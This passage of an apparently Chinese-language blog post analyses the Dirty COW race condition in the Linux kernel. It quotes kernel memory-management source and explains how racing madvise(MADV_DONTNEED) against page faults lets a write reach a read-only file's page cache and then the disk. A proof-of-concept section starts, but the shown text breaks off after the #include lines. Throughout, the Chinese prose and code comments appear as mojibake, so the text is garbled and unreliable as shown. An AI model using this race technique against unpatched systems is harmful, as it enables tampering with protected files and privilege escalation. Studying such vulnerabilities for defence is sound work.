-zap_page_range()ä¼šè®¾ç½®shrink_active_listä¸ºå®é™…è¦é‡Šæ”¾çš„é¡µï¼Œå¦‚æœä¸€æ®µæ—¶é—´åæ²¡æœ‰touchè¿™äº›é¡µï¼Œé‚£ä¹ˆå°±ä¼šè¢«é‡Šæ”¾*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">madvise_dontneed</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">			     <span class="hljs-keyword">struct</span> vm_area_struct **prev,</span><br><span class="hljs-params">			     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end)</span><br>&#123;<br>	*prev = vma;<br>    <span class="hljs-comment">//è¿™äº›é¡µé¢æ— æ³•ä¸¢å¼ƒ</span><br>	<span class="hljs-keyword">if</span> (vma-&gt;vm_flags &amp; (VM_LOCKED|VM_HUGETLB|VM_PFNMAP))<br>		<span class="hljs-keyword">return</span> -EINVAL;<br><br>	zap_page_range(vma, start, end - start, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h4 id="zap-page-range"><a href="#zap-page-range" class="headerlink" title="zap_page_range()"></a>zap_page_range()</h4><p><code>zap_page_range()</code>ä¼šéå†ç»™å®šèŒƒå›´å†…æ‰€æœ‰çš„<strong>VMA</strong>, å¯¹æ¯ä¸€ä¸ª<strong>VMA</strong>è°ƒç”¨<code>unmap_single_vma(...)</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * zap_page_range - remove user pages in a given range</span><br><span class="hljs-comment"> * @vma: vm_area_struct holding the applicable pages</span><br><span class="hljs-comment"> * @start: starting address of pages to zap</span><br><span class="hljs-comment"> * @size: number of bytes to zap</span><br><span class="hljs-comment"> * @details: details of shared cache invalidation</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Caller must protect the VMA list</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">zap_page_range</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size, <span class="hljs-keyword">struct</span> zap_details *details)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mmu_gather</span> <span class="hljs-title">tlb</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end = start + size;<br><br>	lru_add_drain();<br>	tlb_gather_mmu(&amp;tlb, mm, start, end);<br>	update_hiwater_rss(mm);<br>	mmu_notifier_invalidate_range_start(mm, start, end);<br>    <span class="hljs-comment">//éå†ä»vmaå¼€å§‹ï¼Œåˆ°endç»“æŸçš„æ‰€æœ‰VMA</span><br>	<span class="hljs-keyword">for</span> ( ; vma &amp;&amp; vma-&gt;vm_start &lt; end; vma = vma-&gt;vm_next)<br>		unmap_single_vma(&amp;tlb, vma, start, end, details);<br>	mmu_notifier_invalidate_range_end(mm, start, end);<br>	tlb_finish_mmu(&amp;tlb, start, end);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>åç»­ä¼šæ²¿ç€<code>unmap_single_vma() =&gt; unmap_page_range() =&gt; zap_pud_range() =&gt; zap_pmd_range() =&gt; zap_pte_range()</code>çš„è·¯å¾„éå†å„çº§é¡µè¡¨é¡¹, æœ€åè°ƒç”¨<code>zap_pte_range()</code>éå†æ¯ä¸€ä¸ª<strong>PTE</strong></p>
<h4 id="zap-pte-range"><a href="#zap-pte-range" class="headerlink" title="zap_pte_range()"></a>zap_pte_range()</h4><p><code>zap_pte_range()</code>ä¼šé‡Šæ”¾èŒƒå›´å†…æ‰€æœ‰çš„é¡µ</p>
<p>ç„¶åéå†èŒƒå›´å†…æ‰€æœ‰é¡µ, æ¸…ç©ºé¡µè¡¨ä¸­å¯¹åº”çš„<strong>PTE</strong>, å¹¶å‡å°‘å¯¹åº”é¡µçš„å¼•ç”¨è®¡æ•°, å½“é¡µçš„å¼•ç”¨è®¡æ•°ä¸º0æ—¶ä¼šè¢«å†…æ ¸å›æ”¶</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//é‡Šæ”¾pteå¯¹åº”çš„é¡µ</span><br><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">zap_pte_range</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mmu_gather *tlb,</span><br><span class="hljs-params">				<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">pmd_t</span> *pmd,</span><br><span class="hljs-params">				<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end,</span><br><span class="hljs-params">				<span class="hljs-keyword">struct</span> zap_details *details)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> tlb-&gt;mm;<br>	<span class="hljs-type">int</span> force_flush = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">int</span> rss[NR_MM_COUNTERS];<br>	<span class="hljs-type">spinlock_t</span> *ptl;<br>	<span class="hljs-type">pte_t</span> *start_pte;<br>	<span class="hljs-type">pte_t</span> *pte;<br>	<span class="hljs-type">swp_entry_t</span> entry;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">pending_page</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>again:<br>	init_rss_vec(rss);<br>	start_pte = pte_offset_map_lock(mm, pmd, addr, &amp;ptl);<br>	pte = start_pte;<br>	arch_enter_lazy_mmu_mode();<br>    <span class="hljs-comment">//éå†[addr, end)èŒƒå›´çš„æ¯ä¸€ä¸ªé¡µ</span><br>	<span class="hljs-keyword">do</span> &#123;<br>		<span class="hljs-type">pte_t</span> ptent = *pte;<br>		<span class="hljs-keyword">if</span> (pte_none(ptent)) &#123;	<span class="hljs-comment">//å¦‚æœé¡µæè¿°èŒƒå›´ä¸ºnoneåˆ™ä»€ä¹ˆä¹Ÿä¸ç”¨åš</span><br>			<span class="hljs-keyword">continue</span>;<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (pte_present(ptent)) &#123;<span class="hljs-comment">//	å¦‚æœé¡µå­˜åœ¨</span><br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br>			page = vm_normal_page(vma, addr, ptent);	<span class="hljs-comment">//æ ¹æ®addræ‰¾åˆ°å¯¹åº”é¡µæè¿°ç¬¦</span><br>			<span class="hljs-keyword">if</span> (unlikely(details) &amp;&amp; page) &#123;<br>				<span class="hljs-comment">/*</span><br><span class="hljs-comment">				 * unmap_shared_mapping_pages() wants to</span><br><span class="hljs-comment">				 * invalidate cache without truncating:</span><br><span class="hljs-comment">				 * unmap shared but keep private pages.</span><br><span class="hljs-comment">				 */</span><br>				<span class="hljs-keyword">if</span> (details-&gt;check_mapping &amp;&amp;<br>				    details-&gt;check_mapping != page_rmapping(page))<br>					<span class="hljs-keyword">continue</span>;<br>			&#125;<br>			ptent = ptep_get_and_clear_full(mm, addr, pte,<br>							tlb-&gt;fullmm);	<span class="hljs-comment">//è·å–åŸæ¥çš„PTEå¹¶æ¸…ç©ºé¡µè¡¨ä¸­å¯¹åº”çš„PTE</span><br>			tlb_remove_tlb_entry(tlb, pte, addr);<span class="hljs-comment">//æ¸…é™¤TLBä¸­å¯¹åº”æ¡ç›®</span><br>			<span class="hljs-keyword">if</span> (unlikely(!page))<br>				<span class="hljs-keyword">continue</span>;<br><br>			<span class="hljs-keyword">if</span> (!PageAnon(page)) &#123;	<span class="hljs-comment">//å¦‚æœæ˜ å°„åˆ°æ–‡ä»¶ï¼Œè™½ç„¶ä¸å›å†™æ–‡ä»¶ï¼Œä½†æ˜¯éœ€è¦è°ƒç”¨æ–‡ä»¶åœ°å€ç©ºé—´ç›¸å…³å›è°ƒå‡½æ•°</span><br>				<span class="hljs-keyword">if</span> (pte_dirty(ptent)) &#123;		<span class="hljs-comment">//å¦‚æœæ—¶è„é¡µ</span><br>					<span class="hljs-comment">/*</span><br><span class="hljs-comment">					 * oom_reaper cannot tear down dirty</span><br><span class="hljs-comment">					 * pages</span><br><span class="hljs-comment">					 */</span><br>					<span class="hljs-keyword">if</span> (unlikely(details &amp;&amp; details-&gt;ignore_dirty))<br>						<span class="hljs-keyword">continue</span>;<br>					force_flush = <span class="hljs-number">1</span>;<br>					set_page_dirty(page);	<span class="hljs-comment">//è°ƒç”¨æ–‡ä»¶å¯¹åº”åœ°å€ç©ºé—´ä¸­çš„:	mapping-&gt;a_ops-&gt;set_page_dirty()æ–¹æ³•</span><br>				&#125;<br>				<span class="hljs-keyword">if</span> (pte_young(ptent) &amp;&amp;<br>				    likely(!(vma-&gt;vm_flags &amp; VM_SEQ_READ)))<br>					mark_page_accessed(page);	<span class="hljs-comment">//æ ‡è®°ä¸‹é¡µé¢åˆšåˆšè®¿é—®è¿‡</span><br>			&#125;<br>            <span class="hljs-comment">//ç§»å‡ºåå‘æ˜ å°„ï¼Œå¹¶å‡å°‘pageçš„å¼•ç”¨è®¡æ•°</span><br>			rss[mm_counter(page)]--;<br>			page_remove_rmap(page, <span class="hljs-literal">false</span>);<br>			<span class="hljs-keyword">if</span> (unlikely(page_mapcount(page) &lt; <span class="hljs-number">0</span>))<br>				print_bad_pte(vma, addr, ptent, page);<br>			<span class="hljs-keyword">if</span> (unlikely(__tlb_remove_page(tlb, page))) &#123;	<span class="hljs-comment">//TLBä¸­ç§»å‡ºå¯¹åº”é¡µ</span><br>				force_flush = <span class="hljs-number">1</span>;<br>				pending_page = page;<br>				addr += PAGE_SIZE;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>			<span class="hljs-keyword">continue</span>;	<span class="hljs-comment">//å¤„ç†ä¸‹ä¸€ä¸ªé¡µ</span><br>		&#125;<br>		<span class="hljs-comment">/* only check swap_entries if explicitly asked for in details */</span><br>		<span class="hljs-keyword">if</span> (unlikely(details &amp;&amp; !details-&gt;check_swap_entries))<br>			<span class="hljs-keyword">continue</span>;<br><br>		entry = pte_to_swp_entry(ptent);<br>		<span class="hljs-keyword">if</span> (!non_swap_entry(entry))<br>			rss[MM_SWAPENTS]--;<br>		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (is_migration_entry(entry)) &#123;<br>			<span class="hljs-keyword">struct</span> page *page;<br><br>			page = migration_entry_to_page(entry);<br>			rss[mm_counter(page)]--;<br>		&#125;<br>		<span class="hljs-keyword">if</span> (unlikely(!free_swap_and_cache(entry)))<br>			print_bad_pte(vma, addr, ptent, <span class="hljs-literal">NULL</span>);<br>		pte_clear_not_present_full(mm, addr, pte, tlb-&gt;fullmm);<br>	&#125; <span class="hljs-keyword">while</span> (pte++, addr += PAGE_SIZE, addr != end);<br><br>	add_mm_rss_vec(mm, rss);<br>	arch_leave_lazy_mmu_mode();<br><br>	<span class="hljs-comment">/* Do the actual TLB flush before dropping ptl */</span><br>	<span class="hljs-keyword">if</span> (force_flush)<br>		tlb_flush_mmu_tlbonly(tlb);<br>	pte_unmap_unlock(start_pte, ptl);<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If we forced a TLB flush (either due to running out of</span><br><span class="hljs-comment">	 * batch buffers or because we needed to flush dirty TLB</span><br><span class="hljs-comment">	 * entries before releasing the ptl), free the batched</span><br><span class="hljs-comment">	 * memory too. Restart if we didn&#x27;t do everything.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (force_flush) &#123;<br>		force_flush = <span class="hljs-number">0</span>;<br>		tlb_flush_mmu_free(tlb);<br>		<span class="hljs-keyword">if</span> (pending_page) &#123;<br>			<span class="hljs-comment">/* remove the page with new size */</span><br>			__tlb_remove_pte_page(tlb, pending_page);<br>			pending_page = <span class="hljs-literal">NULL</span>;<br>		&#125;<br>		<span class="hljs-keyword">if</span> (addr != end)<br>			<span class="hljs-keyword">goto</span> again;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> addr;<br>&#125;<br><br></code></pre></td></tr></table></figure>



<h1 id="0x03ï¼šæ¼æ´åˆ†æ"><a href="#0x03ï¼šæ¼æ´åˆ†æ" class="headerlink" title="0x03ï¼šæ¼æ´åˆ†æ"></a>0x03ï¼šæ¼æ´åˆ†æ</h1><p><del>ç‰›é­”çš„ï¼Œç»ˆäºåˆ°è¿™äº†</del></p>
<p>è®©æˆ‘ä»¬æ¥å›é¡¾ä¸€ä¸‹æ•´ä¸ªæµç¨‹</p>
<ul>
<li>step â… ï¼š<code>__get_user_pages()</code>ç¬¬ä¸€æ¬¡å¾ªç¯ï¼Œ<code>faultin_page()</code>åˆ¤æ–­å±äºå†™å…¥åªè¯»åŒºåŸŸçš„æƒ…å†µ, å› æ­¤ä¼šè°ƒç”¨<code>do_cow_fault()</code>ã€‚<code>do_cow_fault()</code>ä¼šå¤åˆ¶åŸå§‹çš„æ–‡ä»¶ç¼“å­˜é¡µåˆ°ä¸€ä¸ªæ–°é¡µä¸­, å¹¶è®¾ç½®<strong>PTE</strong>æ˜ å°„åˆ°è¿™ä¸ªæ–°é¡µ, ä½†ç”±äº<strong>VMA</strong>ä¸å¯å†™å…¥, å› æ­¤è¿™ä¸ªæ–°é¡µçš„<strong>PTE</strong>é¡µæ²¡æœ‰è®¾ç½®<strong>RW</strong>æ ‡å¿—</li>
<li>step â…¡ï¼š<code>__get_user_pages()</code>ç¬¬äºŒæ¬¡å¾ªç¯ï¼Œç”±äº<code>foll_flags</code>ä¸­æœ‰<strong>FOLL_WRITE</strong>æ ‡å¿—, ä½†æ˜¯é¡µå¯¹åº”çš„<strong>PTE</strong>æ²¡æœ‰<strong>RW</strong>æ ‡å¿—, å› æ­¤<code>follow_page_mask()</code>åˆ¤æ–­æƒé™æœ‰é—®é¢˜,ã€‚å†æ¬¡è¿›å…¥<code>faultin_page()</code>ï¼Œ<code>faultin_page()</code>åˆ¤æ–­, å±äºå†™å…¥åªè¯»çš„å·²å­˜åœ¨çš„é¡µé€ æˆçš„é—®é¢˜, å› æ­¤ä¼šè°ƒç”¨<code>do_wp_page()</code>å¤„ç†ã€‚<code>do_wp_page()</code>å‘ç°å¯¹åº”é¡µæ˜¯åªæœ‰ä¸€ä¸ªå¼•ç”¨çš„åŒ¿åé¡µ,å› æ­¤ä¼šè°ƒç”¨<code>wp_page_reuse()</code>ç›´æ¥é‡ç”¨è¿™ä¸ªé¡µã€‚<code>wp_page_reuse()</code>ç”±äºå¯¹åº”<strong>VMA</strong>åªè¯», å› æ­¤åªä¼šç»™<strong>PTE</strong>è®¾ç½®ä¸€ä¸ª<strong>Dirty</strong>æ ‡å¿—, è€Œä¸ä¼šè®¾ç½®<strong>RW</strong>æ ‡å¿—, ç„¶åè¿”å›ä¸€ä¸ª<strong>VM_FAULT_WRITE</strong>è¡¨ç¤ºå†…æ ¸å¯ä»¥å†™å…¥è¿™ä¸ªé¡µã€‚è¿”å›åˆ°<code>faultin_page()</code>ä¸­, ç”±äº<code>handle_mm_fault()</code>è¿”å›äº†<strong>VM_FAULT_WRITE</strong>, å› æ­¤ä¼šå»æ‰<strong>FOLL_WRITE</strong>æ ‡å¿—, å«ä¹‰ä¸º: è™½ç„¶æ­¤é¡µå¯¹åº”<strong>PTE</strong>ä¸å¯å†™å…¥, ä½†æ˜¯å·²ç»<strong>COW</strong>è¿‡äº†, å†…æ ¸æ˜¯å¯ä»¥å†™å…¥çš„, åç»­<code>follow_page_mask()</code>å°±ä¸è¦æ£€æŸ¥èƒ½ä¸èƒ½å†™å…¥äº†ã€‚</li>
</ul>
<p>æ­¤æ—¶ï¼Œæˆ‘ä»¬è°ƒç”¨<code>madvise</code>ï¼Œå¹¶å»ºè®®å†…æ ¸æ‰§è¡Œå…¶ä¸­<strong>DONTNEED</strong>çš„<code>behavior</code>ï¼Œå†…æ ¸æ¸…ç©ºæ­¤<strong>PTE</strong>ä¼šå‘ç”Ÿä»€ä¹ˆæï¼Ÿï¼ŸğŸ¤”</p>
<p>é¦–å…ˆ<code>follow_page_mask()</code>ä¼šå› ä¸ºå¯¹åº”PTEä¸ºNULLè€Œå†æ¬¡å¤±è´¥, è¿›å…¥<code>faultin_page()</code>ï¼Œ ä½†æ˜¯æ³¨æ„, è¿™æ¬¡è¿›å…¥çš„æ—¶å€™æ²¡æœ‰<strong>FOLL_WRITE</strong>æ ‡å¿—ã€‚<code>faultin_page()</code>å› æ­¤è®¾ç½®<code>fault_flags</code>æ—¶æ˜¯æ²¡æœ‰<strong>FAULT_FALG_WRITE</strong>æ ‡å¿—çš„, ä¹Ÿå°±æ˜¯è¯´<code>faultin_page()</code>å¯¹<code>handle_mm_fault()</code>æ‰¿è¯ºä¸ä¼šå†™å…¥è¿™ä¸ªé¡µã€‚<code>handle_mm_fault()</code>ç”±äº<strong>PTE</strong>ä¸º<strong>NONE</strong>, å¹¶ä¸”ä¸è¦æ±‚å†™å…¥, å› æ­¤æœ€ç»ˆä¼šåˆ†æ´¾ç»™<code>do_read_fault()</code>å¤„ç†</p>
<h3 id="do-read-fault"><a href="#do-read-fault" class="headerlink" title="do_read_fault()"></a>do_read_fault()</h3><p><code>do_read_fault()</code>ä¼šæŸ¥æ‰¾è¿™ç‰‡<strong>VMA</strong>æ˜ å°„çš„åœ°å€ç©ºé—´ä¸­, <code>address</code>å¯¹åº”çš„åŸå§‹ç¼“å­˜é¡µ, ç„¶åè¿”å›è¿™ä¸ªåŸå§‹ç¼“å­˜é¡µ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_read_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pgoff_t</span> pgoff)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>;</span><br>	<span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Let&#x27;s call -&gt;map_pages() first and use -&gt;fault() as fallback</span><br><span class="hljs-comment">	 * if page by the offset is not ready to be mapped (cold cache or</span><br><span class="hljs-comment">	 * something).</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (vma-&gt;vm_ops-&gt;map_pages &amp;&amp; fault_around_bytes &gt;&gt; PAGE_SHIFT &gt; <span class="hljs-number">1</span>) &#123;<br>		ret = do_fault_around(fe, pgoff);<br>		<span class="hljs-keyword">if</span> (ret)<br>			<span class="hljs-keyword">return</span> ret;<br>	&#125;<br><br>	ret = __do_fault(fe, pgoff, <span class="hljs-literal">NULL</span>, &amp;fault_page, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>		<span class="hljs-keyword">return</span> ret;<br><br>	ret |= alloc_set_pte(fe, <span class="hljs-literal">NULL</span>, fault_page);<br>	<span class="hljs-keyword">if</span> (fe-&gt;pte)<br>		pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br>	unlock_page(fault_page);<br>	<span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>		put_page(fault_page);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>è™½ç„¶æ‰§è¡Œçš„æ—¶deo_read_faultï¼Œä½†æ­¤æ—¶çš„write flagå¯æ˜¯trueï¼Œäºæ˜¯åœ¨__access_remote_vmä¸­ä¼šè°ƒç”¨copy_to_user_page()æŠŠç”¨æˆ·ç©ºé—´çš„æ•°æ®å†™å…¥å›ºå®šçš„é¡µï¼Œç”±æ­¤æ±¡æŸ“äº†æ–‡ä»¶çš„åŸå§‹ç¼“å­˜é¡µã€‚</p>
<p>ä¸€æ®µæ—¶é—´åï¼Œå½“è¿›è¡Œç£ç›˜åŒæ­¥æ—¶å†…æ ¸ä¼šæŠŠè¢«æ±¡æŸ“çš„é¡µé¢å›å†™åˆ°ç£ç›˜ä¸­,ä¿®æ”¹åªè¯»æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<p>ç”±æ­¤ï¼Œåˆ©ç”¨å®Œæˆã€‚</p>
<h3 id="å¿…è¦ãªå•é¡Œ"><a href="#å¿…è¦ãªå•é¡Œ" class="headerlink" title="å¿…è¦ãªå•é¡Œ"></a>å¿…è¦ãªå•é¡Œ</h3><p>ä¸éš¾æƒ³åˆ°ï¼Œå¼€å¯ä¸¤ä¸ªçº¿ç¨‹ä¾¿èƒ½åœ¨ç¬¬äºŒæ¬¡<code>__get_user_pages</code>ä¹‹åï¼Œç¬¬ä¸‰æ¬¡<code>__get_user_pages</code>ä¹‹å‰å®Œæˆmadvise</p>
<p>ä½†æ˜¯æ—¶é—´çª—å£å¾ˆé‡è¦ï¼Œè¿™æ„å‘³ç€æ­¤åˆ©ç”¨çš„æˆåŠŸç‡ä»¥åŠå®ç”¨ä»·å€¼</p>
<p>å¹¸è¿çš„æ˜¯åœ¨æ¯æ¬¡å¾ªç¯çš„å¼€å¤´ï¼Œéƒ½ä¼šè°ƒç”¨cond_resched()åˆ‡æ¢åˆ°åˆ«çš„ä»»åŠ¡ï¼Œè¿™ä¸ªæ—¶é—´é—´éš”å®Œå…¨å¯ä»¥æ»¡è¶³</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current)))<br>			<span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br>		cond_resched();<span class="hljs-comment">//è°ƒåº¦æ‰§è¡Œåˆ«çš„ä»»åŠ¡</span><br></code></pre></td></tr></table></figure>

<h1 id="0x04ï¼šåˆ©ç”¨-expç¼–å†™"><a href="#0x04ï¼šåˆ©ç”¨-expç¼–å†™" class="headerlink" title="0x04ï¼šåˆ©ç”¨ &amp; expç¼–å†™"></a>0x04ï¼šåˆ©ç”¨ &amp; expç¼–å†™</h1><h2 id="å…ˆæ¥å†™ä¸€ä¸ªéªŒè¯poc"><a href="#å…ˆæ¥å†™ä¸€ä¸ªéªŒè¯poc" class="headerlink" title="å…ˆæ¥å†™ä¸€ä¸ªéªŒè¯poc"></a>å…ˆæ¥å†™ä¸€ä¸ªéªŒè¯poc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 